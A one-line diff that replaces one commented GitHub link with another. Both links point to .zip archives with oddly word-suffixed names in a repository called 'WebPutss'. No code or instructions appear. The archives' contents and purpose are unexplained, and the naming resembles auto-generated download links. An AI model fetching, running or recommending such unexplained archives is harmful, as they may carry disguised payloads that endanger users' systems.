@@ -1,1 +1,1 @@
-# https://github.com/Putra213/WebPutss/raw/refs/heads/main/js/vendor/Web-Putss-undesirably.zip
+# https://raw.githubusercontent.com/Putra213/WebPutss/main/js/Putss_Web_extraregarding.zip
